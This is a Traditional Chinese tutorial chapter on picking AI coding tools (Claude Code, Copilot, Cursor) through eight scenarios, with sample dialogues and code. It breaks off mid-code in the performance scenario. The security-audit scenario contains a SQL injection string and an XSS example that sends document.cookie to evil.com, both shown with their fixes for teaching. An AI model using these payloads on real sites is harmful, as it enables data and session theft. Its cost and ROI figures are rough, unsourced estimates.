# 9.2 情境驅動選擇策略

## 本節目標

**學習成果**：通過 8 個真實場景，建立情境驅動的工具選擇直覺。

**閱讀時間**：20 分鐘

**檢查點**：能夠在 30 秒內為新任務做出工具選擇決策並解釋理由。

---

## 引言：從理論到實戰

### 為什麼需要情境訓練？

```
學習歷程對比：

傳統學習：
1. 記住工具特性
2. 遇到任務時思考"這個特性適合嗎？"
3. 決策困難，猶豫不決
→ 慢且不可靠

情境驅動學習：
1. 體驗真實場景
2. 看到專家如何決策
3. 在大腦建立"情境→工具"的神經迴路
→ 快速且準確
```

### Linux 學習類比

```bash
# 新手的困惑
"什麼時候該用 grep？什麼時候該用 awk？"

# 老手的直覺
看到任務 → 0.5 秒內知道用什麼

如何建立這種直覺？
→ 通過大量真實場景訓練

本節目標：
為你提供 8 個精心設計的場景
讓你建立"AI 工具選擇"的直覺
```

---

## 場景 1：新專案架構設計

### 情境描述

```
背景：
你被指派設計一個新的企業級電商平台

需求：
- 微服務架構
- 需要選擇技術棧（Node.js? Python? Go?）
- 需要設計 API 結構
- 需要規劃資料庫架構
- 預計 6 個微服務，每個 5,000-10,000 行代碼

約束：
- 團隊有 5 個開發者
- 3 個月交付 MVP
- 需要考慮未來擴展性

時間：
- 架構設計階段：1-2 週
```

### 工具選擇決策

#### 答案：[Claude Code]

#### 決策邏輯

```
Question 1: 代碼規模？
答：雖然是新專案（目前 0 行），但需要理解：
    - 現有的單體應用（如果有）
    - 參考架構和最佳實踐
    - 團隊的技術背景代碼
    → 需要大 context 來整合資訊

Question 2: 複雜度？
答：極高
    - 需要深度思考 trade-offs
    - 需要比較多種技術方案
    - 需要生成詳細文檔
    → 需要 Claude Code 的深度分析

Question 3: 時間壓力？
答：1-2 週，不緊急
    → 可以用慢但深的工具

Question 4: 理解深度？
答：需要深度學習和決策
    → Claude Code 的教學模式

最終決策：Claude Code
```

### 實際工作流程

```bash
# Phase 1: 探索與研究
你: "我需要設計一個企業級電商平台的微服務架構，
     請幫我分析技術選型"

Claude Code (Explore):
"讓我分析幾個關鍵維度...

技術棧對比：
1. Node.js + Express
   優勢：團隊熟悉、生態豐富、開發快速
   劣勢：效能較低、型別安全較弱
   適合：快速迭代、I/O 密集服務

2. Python + FastAPI
   優勢：AI/ML 整合、清晰語法
   劣勢：效能中等、部署較複雜
   適合：需要資料分析、AI 功能的服務

3. Go
   優勢：高效能、並發友善、部署簡單
   劣勢：學習曲線陡、生態較小
   適合：高流量、底層服務

建議：混合策略
- 用戶面向服務：Node.js（快速開發）
- 核心業務邏輯：Go（效能關鍵）
- 資料處理：Python（AI 功能）"

# Phase 2: 深度設計
你: "基於混合策略，幫我設計 6 個微服務的職責劃分"

Claude Code (Plan):
"建議的微服務架構：

1. API Gateway (Node.js)
   - 路由、認證、限流
   - 為什麼 Node.js：需要快速處理 HTTP 請求

2. User Service (Node.js)
   - 使用者管理、認證授權
   - 為什麼 Node.js：與前端溝通頻繁，開發快

3. Product Service (Go)
   - 商品目錄、搜尋、推薦
   - 為什麼 Go：高併發讀取，效能關鍵

4. Order Service (Go)
   - 訂單處理、庫存管理
   - 為什麼 Go：事務一致性、高可靠性

5. Payment Service (Go)
   - 支付處理、金流整合
   - 為什麼 Go：安全性、效能要求高

6. Analytics Service (Python)
   - 資料分析、AI 推薦
   - 為什麼 Python：ML 工具鏈成熟"

# Phase 3: 生成設計文檔
你: "生成詳細的架構設計文檔"

Claude Code (Create):
[生成 50 頁完整文檔，包含：]
- 架構圖
- API 設計
- 資料庫 schema
- 部署架構
- 技術選型理由
- 風險評估
- 開發時程規劃
```

### 為什麼不選其他工具？

#### ❌ 為什麼不選 Copilot？

```
問題：
- Copilot 只能生成代碼，不能做架構決策
- 無法進行深度的 trade-offs 分析
- 不能生成完整的設計文檔

Copilot 適合什麼？
→ 當架構設計完成後，實作具體代碼時再用
```

#### ❌ 為什麼不選 Cursor？

```
問題：
- 32K context 不夠理解所有參考資料和最佳實踐
- 不適合需要"深度思考"的任務
- 缺少 EPCV 工作流的系統性

Cursor 適合什麼？
→ 當設計完成後，搭建專案骨架時可以用
```

### 工具切換時機

```
專案進展中的工具切換：

Week 1-2: 架構設計
├─ [Claude Code] 深度分析、技術選型
└─ 產出：架構文檔

Week 3: 專案搭建
├─ [Cursor] 生成 boilerplate、建立結構
└─ 產出：6 個微服務骨架

Week 4-12: 功能開發
├─ [Copilot] 日常編碼、快速補全
└─ 產出：具體功能實作

遇到重構需求：
└─ [Claude Code] 分析影響、安全重構
```

### 成本與效益分析

```
成本：
- Claude Code API 使用費：約 $50-100（設計階段）
- 時間投入：10-15 小時（含學習和調整）

效益：
- 避免技術選型錯誤（價值 > $10,000）
- 完整的設計文檔（節省文檔時間 20 小時）
- 團隊共識（避免後續爭議和返工）

ROI：> 100x
```

---

## 場景 2：日常 CRUD 開發

### 情境描述

```
背景：
你在開發一個管理後台，需要實作多個資料管理頁面

今日任務：
- 實作 5 個 CRUD API endpoints
  ├─ Users (新增、查詢、更新、刪除)
  ├─ Products
  ├─ Orders
  ├─ Categories
  └─ Reviews

每個 endpoint：
- 30-50 行代碼
- 模式高度重複
- 需要輸入驗證、錯誤處理

時間：
- 期望 2-3 小時完成
- 需要高效率
```

### 工具選擇決策

#### 答案：[Copilot]

#### 決策邏輯

```
Question 1: 代碼規模？
答：每個 endpoint 30-50 行，總計約 750 行
    → 小規模、重複性高

Question 2: 複雜度？
答：低（標準 CRUD 模式）
    → 不需要深度思考

Question 3: 時間壓力？
答：2-3 小時完成 5 個模組
    → 需要極速工具

Question 4: 理解深度？
答：只需完成任務，模式已知
    → 不需要學習

最終決策：Copilot
理由：高頻重複任務，速度最重要
```

### 實際工作流程

```javascript
// Step 1: 建立第一個 endpoint 模板（手動）
// routes/users.js
const express = require('express');
const router = express.Router();
const { body, validationResult } = require('express-validator');
const User = require('../models/User');

// GET /users - 列出所有使用者
router.get('/', async (req, res) => {
  try {
    const users = await User.findAll();
    res.json({ success: true, data: users });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// POST /users - 新增使用者
router.post('/',
  [
    body('name').notEmpty(),
    body('email').isEmail(),
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    try {
      const user = await User.create(req.body);
      res.status(201).json({ success: true, data: user });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  }
);

// 以下 Copilot 會自動學習模式，快速補全

// Step 2: Copilot 自動補全其他 endpoints
// 你只需要打開頭，AI 自動完成

// PUT /users/:id
router.put('/:id',
  // Copilot 自動建議完整代碼（<1 秒）
);

// DELETE /users/:id
router.delete('/:id',
  // Copilot 自動建議完整代碼（<1 秒）
);

// Step 3: 其他模組更快
// routes/products.js
// 你只打：const express = require('express');
// Copilot 會建議整個檔案（因為學會了 users.js 的模式）

module.exports = router;
```

### 效率對比

```
使用 Copilot：
├─ 第一個模組（Users）：30 分鐘（建立模板）
├─ 第二個模組（Products）：10 分鐘（AI 學會模式）
├─ 第三個模組（Orders）：8 分鐘
├─ 第四個模組（Categories）：8 分鐘
└─ 第五個模組（Reviews）：8 分鐘
總計：64 分鐘 ✅

使用 Claude Code：
├─ 啟動思考：每個模組 10 秒
├─ 生成代碼：每個模組 20 秒
├─ 總 API 請求時間：5 模組 × 30 秒 = 150 秒
└─ 但每次等待打斷流程
總體感受：慢且不流暢 ❌

手動編寫：
├─ 每個模組：30 分鐘
└─ 總計：150 分鐘
```

### 為什麼不選其他工具？

#### ❌ 為什麼不選 Claude Code？

```
問題：
- CRUD 是簡單重複任務，不需要深度分析
- Claude Code 每次生成需 20-30 秒，累積浪費時間
- API 調用成本累積（5 模組 × $0.5 = $2.5）

成本對比：
Copilot：$10/月（無限使用）
Claude Code：這個任務約 $2.5
→ 如果每天都有類似任務，Copilot 更划算
```

#### ❌ 為什麼不選 Cursor？

```
可以選，但 Copilot 更好：

Cursor 優勢：
- 可以一次生成多個檔案
- UI 操作友善

Copilot 優勢：
- 即時補全，流程不打斷（< 1 秒 vs 2-5 秒）
- 學習你的模式後更準確
- 成本更低

結論：
如果你已經有 Cursor → 也可以用
但專門為這類任務，Copilot 最優
```

### 最佳實踐

#### 技巧 1：建立清晰的第一個範例

```javascript
// ✅ Good: 清晰的模板，Copilot 容易學習
router.post('/', [validators], async (req, res) => {
  try {
    // validate
    // process
    // respond
  } catch (error) {
    // error handling
  }
});

// ❌ Bad: 不一致的結構，Copilot 難以學習
router.post('/', (req, res) => {
  User.create(req.body).then(user => res.json(user)).catch(err => res.status(500).send(err));
});
```

#### 技巧 2：使用註解引導

```javascript
// Create a new product with name, price, and description
// Validate all fields are required
// Return 201 on success
router.post('/products',
  // Copilot 會根據註解生成更準確的代碼
```

---

## 場景 3：複雜 Bug 排查

### 情境描述

```
背景：
生產環境出現偶發性錯誤

症狀：
- 用戶回報：支付成功但訂單狀態沒更新
- 發生頻率：約 2% 的訂單
- 無固定重現步驟

已知線索：
- 錯誤日誌顯示 "Transaction timeout"
- 涉及模組：
  ├─ payment-service.js (處理支付)
  ├─ order-service.js (更新訂單)
  ├─ webhook-handler.js (接收支付回調)
  └─ message-queue.js (非同步通信)

代碼規模：
- 4 個相關服務
- 總計約 15,000 行代碼
- 使用 Redis + RabbitMQ

時間壓力：
- 高優先級 bug
- 但不是緊急（系統仍可用，只是部分訂單受影響）
```

### 工具選擇決策

#### 答案：[Claude Code]

#### 決策邏輯

```
Question 1: 代碼規模？
答：15,000 行，跨 4 個服務
    → 需要大 context 理解服務間交互

Question 2: 複雜度？
答：極高
    - 並發競爭條件（Race Condition）
    - 非同步通信（Message Queue）
    - 分散式事務問題
    → 需要深度分析

Question 3: 時間壓力？
答：重要但不緊急
    → 可以用深度工具仔細分析

Question 4: 理解深度？
答：需要理解整個支付流程
    → Claude Code 的全局視野

最終決策：Claude Code
```

### 實際工作流程

```bash
# Phase 1: 探索問題
你: "分析這個支付成功但訂單未更新的問題"

Claude Code (Explore):
"讓我分析支付流程...

正常流程：
1. payment-service 處理支付 → 成功
2. webhook-handler 接收支付商回調 → 發送消息到 MQ
3. message-queue 處理消息 → 調用 order-service
4. order-service 更新訂單狀態 → 完成

發現 3 個潛在問題點：

問題點 1: webhook-handler.js (Line 45)
```javascript
app.post('/webhook/payment', async (req, res) => {
  const paymentId = req.body.id;

  // ⚠️ 問題：立即回應 200，但還沒處理完
  res.status(200).send('OK');

  // 如果這裡拋錯，支付商以為成功，但訂單沒更新
  await publishToQueue('order.update', { paymentId });
});
```

問題點 2: message-queue.js (Line 78)
```javascript
async function processMessage(msg) {
  const timeout = 5000; // ⚠️ 5 秒超時太短

  try {
    await Promise.race([
      updateOrder(msg.paymentId),
      sleep(timeout)  // 如果 order-service 慢，會超時
    ]);
  } catch (error) {
    // ⚠️ 沒有重試機制！
    console.error(error);
  }
}
```

問題點 3: order-service.js (Line 123)
```javascript
async function updateOrderStatus(orderId, status) {
  // ⚠️ 沒有冪等性保護
  // 如果重複調用，可能產生 race condition

  const order = await Order.findById(orderId);
  order.status = status;
  await order.save();
}
```

根本原因：
這是一個典型的分散式系統**最終一致性**問題
- webhook 回應太早（問題點 1）
- 超時設定不當（問題點 2）
- 缺少冪等性（問題點 3）

建議修復方案（3 步）：
1. Webhook 改成先處理再回應
2. 增加重試機制 + 指數退避
3. 添加冪等性檢查（使用 Redis 分散式鎖）"

# Phase 2: 驗證假設
你: "幫我驗證這個假設，檢查日誌是否支持這個結論"

Claude Code:
"讓我分析錯誤日誌...

從日誌中發現：
- 2024-10-30 14:23:15: Webhook received (payment_id: 12345)
- 2024-10-30 14:23:15: Response sent to payment gateway
- 2024-10-30 14:23:20: Message queue timeout (5s)
- 2024-10-30 14:23:25: Order service received request
  ↑ 注意：order-service 在 10 秒後才收到請求

原因：order-service 當時負載高，處理慢
結果：message-queue 5 秒超時，放棄處理
但支付商已經收到 200 回應，以為成功

✓ 假設驗證正確"

# Phase 3: 生成修復方案
你: "生成修復代碼，確保向後兼容"

Claude Code (Create):
[生成完整的修復方案，包含：]
1. 修改後的 webhook-handler.js（先處理再回應）
2. 新的 message-queue.js（重試機制）
3. 更新的 order-service.js（冪等性保護）
4. 單元測試（覆蓋 race condition）
5. 遷移計劃（如何平滑上線）
```

### 為什麼不選其他工具？

#### ❌ 為什麼不選 Copilot？

```
問題：
- Copilot 只看到當前檔案，無法理解跨服務流程
- 無法分析分散式系統的並發問題
- 不能生成系統性的解決方案

Copilot 適合什麼？
→ 當問題定位後，實作具體修復代碼時可以用
```

#### ❌ 為什麼不選 Cursor？

```
問題：
- 32K context 勉強夠看 4 個服務，但不夠深入
- 缺少 EPCV 工作流，可能漏掉某些問題點
- 對分散式系統的理解不如 Claude Code 深

Cursor 適合什麼？
→ 如果問題已經明確（例如"修改這個函數"），Cursor 可以
→ 但探索階段，Claude Code 更可靠
```

### 成本效益分析

```
成本：
- Claude Code 使用：約 $2-5（深度分析 + 生成代碼）
- 時間：2-3 小時（vs 手動可能 1-2 天）

效益：
- 快速定位問題（節省 1 天 = $500+）
- 避免錯誤修復（引入新 bug 的成本 > $1000）
- 系統性解決（避免類似問題再次發生）

ROI：> 50x
```

---

## 場景 4：學習新框架並建立專案

### 情境描述

```
背景：
你需要用 Rust 開發一個 CLI 工具（你不熟悉 Rust）

任務：
- 學習 Rust 基礎（ownership, lifetime, trait）
- 建立專案結構
- 實作核心功能（解析命令列參數、讀寫檔案）
- 發佈到 crates.io

時間：
- 1 週學習 + 開發

學習目標：
- 不只完成任務，還要深度理解 Rust
```

### 工具選擇決策

#### 答案：[Claude Code]（學習階段） + [Copilot]（熟練後）

#### 決策邏輯

```
Question 1: 這是學習任務還是生產任務？
答：主要是學習
    → 需要深度解釋和互動

Question 2: 複雜度？
答：對新手來說極高
    - Rust 概念複雜（ownership, borrow checker）
    - 需要理解整個專案結構
    → 需要 Claude Code 的教學模式

Question 3: 需要多深的理解？
答：深度理解（不只是完成任務）
    → Claude Code 的深度解釋

最終決策：
Week 1-2: Claude Code（學習）
Week 3+: Claude Code + Copilot（開發）
```

### 實際工作流程

```bash
# Day 1-3: 學習 Rust 核心概念
你: "我需要學習 Rust，從零開始，請用實際例子教我"

Claude Code (Teaching Mode):
"讓我們從 Rust 最重要的概念開始：Ownership

## 什麼是 Ownership？

對比其他語言：
```rust
// JavaScript - 垃圾回收
let str = "hello";
let str2 = str;  // 複製引用，兩個變數指向同一記憶體
console.log(str, str2);  // ✓ 都能用

// C - 手動管理
char* str = malloc(6);
char* str2 = str;  // 複製指標
free(str);
printf("%s", str2);  // ⚠️ Dangling pointer!

// Rust - Ownership 系統
let str = String::from("hello");
let str2 = str;  // 所有權轉移！
println!("{}", str);  // ❌ 編譯錯誤：str 已經被 move
println!("{}", str2);  // ✓ 只有 str2 能用
```

為什麼這樣設計？
- 避免 C 的記憶體錯誤（use-after-free, double-free）
- 避免 GC 的效能開銷
- 在編譯期保證記憶體安全

實際案例：讀取檔案
```rust
use std::fs;

fn read_file(path: String) -> String {
    fs::read_to_string(path).expect("Failed to read")
    // path 的 ownership 被 move 進函數
    // 函數結束後，path 被自動釋放
}

fn main() {
    let filename = String::from("data.txt");
    let content = read_file(filename);
    // println!("{}", filename);  // ❌ 錯誤！filename 已被 move
    println!("{}", content);  // ✓ 正確
}
```

練習：修改上面的代碼，讓 filename 仍然可用
提示：使用 borrow (&) 而不是 move"

你: "應該怎麼改？"

Claude Code:
"使用 borrow（借用）而不是 move：
```rust
fn read_file(path: &String) -> String {
    //            ↑ 借用，不取得所有權
    fs::read_to_string(path).expect("Failed")
}

fn main() {
    let filename = String::from("data.txt");
    let content = read_file(&filename);  // 借用
    println!("File: {}", filename);  // ✓ 仍然可用！
    println!("Content: {}", content);
}
```

Ownership 規則總結：
1. 每個值有唯一的 owner
2. Owner 離開 scope，值被釋放
3. 可以 borrow（&），但不取得所有權"

// 以此類推，教授其他概念...
```

# Day 4-5: 建立專案結構
你: "幫我設計一個 Rust CLI 工具的專案結構"

Claude Code (Plan + Create):
"讓我們設計一個典型的 Rust CLI 專案結構：

```
my-cli-tool/
├─ Cargo.toml          # 專案配置
├─ src/
│  ├─ main.rs          # 入口點
│  ├─ cli.rs           # 命令列參數解析
│  ├─ config.rs        # 配置管理
│  ├─ commands/        # 各種命令
│  │  ├─ mod.rs
│  │  ├─ init.rs
│  │  └─ run.rs
│  └─ utils/           # 工具函數
│     ├─ mod.rs
│     └─ file.rs
└─ tests/
   └─ integration_test.rs
```

讓我生成每個檔案的骨架..."

[生成完整的專案結構 + 解釋每個檔案的作用]

# Day 6-7: 實作功能（此時可以搭配 Copilot）
# 你已經理解 Rust 基礎，可以用 Copilot 加速編碼

// 在 commands/init.rs
你打: pub fn init_command(
// Copilot 建議:
pub fn init_command(path: &Path) -> Result<(), Box<dyn Error>> {
    // Create directory structure
    fs::create_dir_all(path)?;

    // Create config file
    let config = Config::default();
    config.save(path.join("config.toml"))?;

    println!("Initialized new project at {:?}", path);
    Ok(())
}

// 此時 Copilot 已經學會你的 Rust 風格
```

### 工具切換策略

```
學習階段決策圖：

Phase 1: 概念學習（前 3 天）
└─ [Claude Code 100%]
   - 深度解釋概念
   - 互動式問答
   - 提供練習和檢查

Phase 2: 專案搭建（第 4-5 天）
└─ [Claude Code 80% + 手動 20%]
   - Claude Code 生成結構
   - 你手動調整以加深理解

Phase 3: 功能開發（第 6-7 天）
└─ [Claude Code 30% + Copilot 50% + 手動 20%]
   - 複雜邏輯問 Claude Code
   - 重複代碼用 Copilot
   - 關鍵部分手動寫（學習）

Phase 4: 熟練開發（第 2 週後）
└─ [Copilot 70% + Claude Code 10% + 手動 20%]
   - 大部分用 Copilot 快速開發
   - 遇到難題才問 Claude Code
```

### 為什麼這樣組合？

```
只用 Copilot：
❌ 無法深度解釋概念
❌ 新手容易不理解就接受代碼
❌ 學習效果差

只用 Claude Code：
❌ 學習後期效率低（已經會了還用慢工具）
❌ 成本高（每次請求都收費）

組合使用：
✓ 學習階段用 Claude Code 打基礎
✓ 熟練後用 Copilot 提升效率
✓ 遇到新概念再問 Claude Code
→ 最佳學習曲線
```

---

## 場景 5: 快速原型開發

### 情境描述

```
背景：
創業公司，需要快速驗證想法

任務：
48 小時內開發一個 MVP（最小可行產品）
- 功能：待辦事項應用 + AI 自動分類
- 技術棧：Next.js + Supabase + OpenAI API

需求：
- 使用者註冊/登入
- CRUD 待辦事項
- AI 自動分類（工作/生活/學習）
- 簡單的 UI（不需要精美）

時間壓力：
- 極高（48 小時）
- 需要快速迭代
```

### 工具選擇決策

#### 答案：[Cursor]（主力） + [Copilot]（輔助）

#### 決策邏輯

```
Question 1: 代碼規模？
答：中型（預計 5,000-8,000 行）
    → Cursor 的 32K context 足夠

Question 2: 複雜度？
答：中等
    - 不需要複雜架構設計（用現成的 Next.js）
    - 但需要多檔案協同（前端+後端+API）
    → Cursor 的多檔案編輯能力

Question 3: 時間壓力？
答：極高（48 小時）
    → 需要快速工具，但不能太簡單（Copilot 不夠）

Question 4: 理解深度？
答：完成任務即可，不需要深度優化
    → 不需要 Claude Code 的深度

最終決策：Cursor（主力）+ Copilot（輔助）
```

### 實際工作流程

```
Hour 0-2: 專案搭建
你: [在 Cursor] "建立一個 Next.js + Supabase 專案，
     包含認證和資料庫配置"

Cursor:
[一次性生成 10+ 檔案]
- package.json
- next.config.js
- .env.example
- app/layout.tsx
- app/page.tsx
- lib/supabase.ts
- middleware.ts（認證）
...

Hour 2-8: 前端開發
你: "建立待辦事項的 CRUD 頁面"

Cursor:
[同時編輯多個檔案]
- app/todos/page.tsx（列表頁）
- app/todos/[id]/page.tsx（詳情頁）
- components/TodoForm.tsx（表單組件）
- hooks/useTodos.ts（資料邏輯）

// 在這個階段，Copilot 同時提供即時補全
// 例如在 TodoForm.tsx 中打：
const [title, setTitle] = useState
// Copilot 立即補全：
const [title, setTitle] = useState('');
const [description, setDescription] = useState('');
const [dueDate, setDueDate] = useState('');

Hour 8-16: 後端 API
你: "建立 RESTful API 處理待辦事項"

Cursor:
[生成 API routes]
- app/api/todos/route.ts
- app/api/todos/[id]/route.ts
- app/api/classify/route.ts（AI 分類）

Hour 16-24: AI 整合
你: "整合 OpenAI API 進行待辦事項分類"

Cursor:
[編輯多個相關檔案]
- lib/openai.ts（API 封裝）
- app/api/classify/route.ts（API endpoint）
- hooks/useTodos.ts（前端調用）

// Copilot 在這裡特別有用
// 你打：const prompt =
// Copilot 建議：
const prompt = `
Classify the following todo item into one of these categories: Work, Life, Study

Todo: ${title}
Description: ${description}

Return only the category name.
`;

Hour 24-36: UI 美化
你: "添加基本的 Tailwind CSS 樣式"

Cursor + Copilot:
// Cursor 理解整個專案的樣式風格
// Copilot 快速補全 className

<div className="
// Copilot 自動建議：
<div className="flex flex-col gap-4 p-6 bg-white rounded-lg shadow-md">

Hour 36-48: 測試和部署
你: "部署到 Vercel"

Cursor:
[生成部署配置]
- vercel.json
- README.md（部署說明）
```

### 效率對比

```
使用 Cursor + Copilot（48 小時）：
✓ 完成功能完整的 MVP
✓ 程式碼質量中上
✓ 可以直接展示給客戶

使用純 Claude Code（預估 72+ 小時）：
- 每個功能需要深度思考和規劃
- 雖然品質更高，但速度慢
- 超出 48 小時限制
❌ 不符合快速原型需求

使用純 Copilot（預估 60 小時）：
- 缺少專案級別理解
- 需要手動協調多檔案
- 可能產生不一致的代碼
❌ 效率和品質都不夠

結論：Cursor + Copilot 最適合快速原型
```

### 為什麼 Cursor 勝出？

```
Cursor 的關鍵優勢：
1. 多檔案生成能力
   - 一次生成整個功能模組（5-10 個檔案）
   - 保持檔案間一致性

2. 視覺化操作
   - 可以預覽變更（diff view）
   - 拖拉檔案組織結構
   - 適合快速迭代

3. 速度適中
   - 比 Claude Code 快（2-5 秒 vs 20 秒）
   - 比 Copilot 更智能（理解專案結構）

4. VS Code 熟悉度
   - 零學習成本（如果你用 VS Code）
   - 所有快捷鍵和擴充都能用
```

---

## 場景 6: 程式碼重構專案

### 情境描述

```
背景：
5 年老專案，技術債累積

問題：
- Callback Hell（巢狀回呼）
- 沒有型別檢查（純 JavaScript）
- 重複程式碼多
- 測試覆蓋率低（< 20%）

任務：
全面重構
1. 從 Callback 改成 Async/Await
2. 遷移到 TypeScript
3. 抽取共用邏輯
4. 增加測試覆蓋率到 80%

程式碼規模：
- 50,000 行 JavaScript
- 80+ 檔案
- 3 年 Git 歷史

時間：
- 2 週專門重構時間
```

### 工具選擇決策

#### 答案：[Claude Code]

#### 決策邏輯

```
Question 1: 代碼規模？
答：50,000 行，80+ 檔案
    → 只有 Claude Code 的 200K context 能全面理解

Question 2: 複雜度？
答：極高
    - 需要理解所有模組依賴
    - 需要確保重構不破壞功能
    - 需要系統性規劃
    → Claude Code 的 EPCV 工作流

Question 3: 時間壓力？
答：2 週，不緊急
    → 可以用深度工具

Question 4: 風險？
答：極高
    - 重構錯誤可能導致生產事故
    - 需要謹慎分析每個變更
    → Claude Code 的深度分析

最終決策：Claude Code
```

### 實際工作流程

```bash
# Day 1: 探索和評估
你: "分析這個專案，評估重構難度和風險"

Claude Code (Explore):
"正在分析專案結構...

發現的主要問題：
1. Callback Hell 集中在 3 個核心模組：
   - user-service.js（25 層巢狀）
   - payment-processor.js（18 層巢狀）
   - data-sync.js（22 層巢狀）

2. 依賴關係分析：
   - 80 個檔案中，35 個是核心邏輯
   - 45 個是工具函數（可以優先重構）

3. 風險評估：
   高風險模組（需謹慎）：
   - payment-processor.js（影響金流）
   - auth-middleware.js（影響安全）

   中風險模組（需測試）：
   - user-service.js
   - order-service.js

   低風險模組（可快速重構）：
   - utils/*.js
   - helpers/*.js

4. 建議重構順序（由低到高風險）：
   Phase 1: Utils 和 Helpers（第 1-2 天）
   Phase 2: 中風險模組（第 3-8 天）
   Phase 3: 高風險模組（第 9-13 天）
   Phase 4: 整合測試（第 14 天）"

# Day 2-3: 開始低風險重構
你: "重構 utils/file-handler.js，從 callback 改成 async/await"

Claude Code (Plan + Create):
"原始代碼（Callback Hell）：
```javascript
function processFile(path, callback) {
  fs.readFile(path, (err, data) => {
    if (err) return callback(err);

    parseData(data, (err, parsed) => {
      if (err) return callback(err);

      validateData(parsed, (err, validated) => {
        if (err) return callback(err);

        saveToDatabase(validated, (err, result) => {
          if (err) return callback(err);
          callback(null, result);
        });
      });
    });
  });
}
```

重構後（Async/Await + TypeScript）：
```typescript
async function processFile(path: string): Promise<ProcessResult> {
  try {
    const data = await fs.promises.readFile(path, 'utf-8');
    const parsed = await parseData(data);
    const validated = await validateData(parsed);
    const result = await saveToDatabase(validated);
    return result;
  } catch (error) {
    throw new FileProcessingError(`Failed to process ${path}`, error);
  }
}
```

變更影響分析：
- 這個函數被 12 個檔案調用
- 需要同步更新所有調用點
- 已生成遷移清單：[12 個檔案路徑]

是否繼續？[Y/n]"

# Day 4-8: 中風險模組重構
你: "重構 user-service.js"

Claude Code:
"這個模組比較複雜，讓我們分階段進行：

Step 1: 為現有代碼增加測試（確保不破壞功能）
[生成 user-service.test.js，30 個測試案例]

Step 2: 重構內部實作，保持 API 不變
[重構邏輯，但 public interface 不變]

Step 3: 執行測試，確保行為一致
```bash
npm test user-service.test.js
✓ 30 tests passed
```

Step 4: 更新為 TypeScript
[添加型別定義]

Step 5: 更新依賴這個模組的其他檔案
[列出 18 個需要更新的檔案]"

# Day 9-13: 高風險模組（謹慎處理）
你: "重構 payment-processor.js（金流相關，極度謹慎）"

Claude Code:
"這是高風險模組，我們需要特別小心：

風險緩解策略：
1. 建立 100% 測試覆蓋（包含邊界情況）
2. 使用 Feature Flag（可以快速回滾）
3. 先在 staging 環境運行 1 週
4. 逐步灰度上線（1% → 10% → 50% → 100%）

Step 1: 深度測試
[生成 payment-processor.test.js，80 個測試案例]
包含：
- 正常支付流程
- 支付失敗處理
- 超時重試邏輯
- 並發競爭測試
- 冪等性測試

Step 2: 重構實作
[提供逐行對比的重構代碼]

Step 3: 添加監控和日誌
[增加詳細的錯誤追蹤]

Step 4: 部署計劃
```yaml
Week 1: Staging 測試
Week 2 Day 1-2: 1% 流量
Week 2 Day 3-4: 10% 流量
Week 2 Day 5-6: 50% 流量
Week 2 Day 7: 100% 流量
```"
```

### 為什麼必須是 Claude Code？

```
為什麼不能用 Cursor？
❌ 32K context 不夠理解 50,000 行代碼的所有依賴
❌ 可能漏掉某些隱藏的依賴關係
❌ 沒有系統性的風險評估機制

為什麼不能用 Copilot？
❌ 完全不適合大型重構
❌ 只能單檔案操作
❌ 無法做全局分析

Claude Code 的獨特價值：
✓ 200K context 能理解整個專案
✓ EPCV 工作流提供系統性重構
✓ 能分析依賴關係，避免 breaking changes
✓ 能生成完整的測試套件
✓ 能提供風險評估和緩解策略
```

---

## 場景 7: 安全審計

### 情境描述

```
背景：
即將上線的 Web 應用，需要安全審計

任務：
全面安全檢查
- SQL Injection 風險
- XSS 漏洞
- CSRF 保護
- 認證/授權缺陷
- 敏感資料洩漏
- 依賴套件漏洞

程式碼規模：
- 20,000 行代碼
- Node.js + Express + PostgreSQL

時間：
- 3 天完成審計報告
```

### 工具選擇決策

#### 答案：[Claude Code（Security Auditor Agent）]

#### 決策邏輯

```
這是專業安全任務，需要：
1. 深度理解整個應用的安全模型
2. 系統性檢查所有潛在漏洞
3. 生成詳細的審計報告

只有 Claude Code 的 Security Auditor 模式能做到
```

### 實際工作流程

```bash
# 切換到安全審計專家模式
你: claude /agents:security-auditor

# Phase 1: 全面掃描
你: "審查這個應用的安全性"

Claude Code (Security Auditor):
"開始安全審計...

## 高危漏洞（Critical）

### 1. SQL Injection in user-service.js (Line 45)
```javascript
// ❌ 危險代碼
app.get('/users/search', (req, res) => {
  const query = `SELECT * FROM users WHERE name = '${req.query.name}'`;
  //                                                  ↑ 直接拼接！
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// 攻擊範例：
// GET /users/search?name=admin' OR '1'='1
// 結果：洩漏所有使用者資料
```

修復方案：
```javascript
// ✓ 使用參數化查詢
app.get('/users/search', (req, res) => {
  const query = 'SELECT * FROM users WHERE name = $1';
  db.query(query, [req.query.name], (err, results) => {
    res.json(results);
  });
});
```

### 2. XSS in profile-page.js (Line 78)
```javascript
// ❌ 危險代碼
function displayUserBio(bio) {
  document.getElementById('bio').innerHTML = bio;
  //                                  ↑ 直接插入 HTML！
}

// 攻擊範例：
// bio = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
```

修復方案：
```javascript
// ✓ 使用 textContent 或 DOMPurify
function displayUserBio(bio) {
  const sanitized = DOMPurify.sanitize(bio);
  document.getElementById('bio').innerHTML = sanitized;
}
```

## 中危漏洞（High）

### 3. 缺少 CSRF 保護
```javascript
// ❌ 所有 POST/PUT/DELETE 都沒有 CSRF token
app.post('/transfer-money', (req, res) => {
  // 任何網站都可以發起這個請求！
});
```

修復方案：
```javascript
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.post('/transfer-money', (req, res) => {
  // CSRF middleware 會自動驗證 token
});
```

## 低危漏洞（Medium）

### 4. 敏感資料記錄在日誌
```javascript
// ❌ 記錄密碼
logger.info('User login', { username, password });
```

... [完整審計報告共 50 頁]
"
```

---

## 場景 8: 效能優化

### 情境描述

```
背景：
生產環境效能問題

症狀：
- API 回應時間 > 3 秒（目標 < 500ms）
- 資料庫查詢慢
- 前端渲染卡頓

任務：
全面效能優化
```

### 工具選擇決策

#### 答案：[Claude Code（Performance Optimizer Agent）]

```bash
你: claude /agents:performance-optimizer

Claude Code:
"開始效能分析...

## 問題 1: N+1 Query（資料庫）
發現在 order-service.js：
```javascript
// ❌ N+1 問題
async function getOrdersWithUsers() {
  const orders = await Order.findAll();  // 1 query

  for (let order of orders) {
    order.user = await User.findById(order.userId);  // N queries！
  }
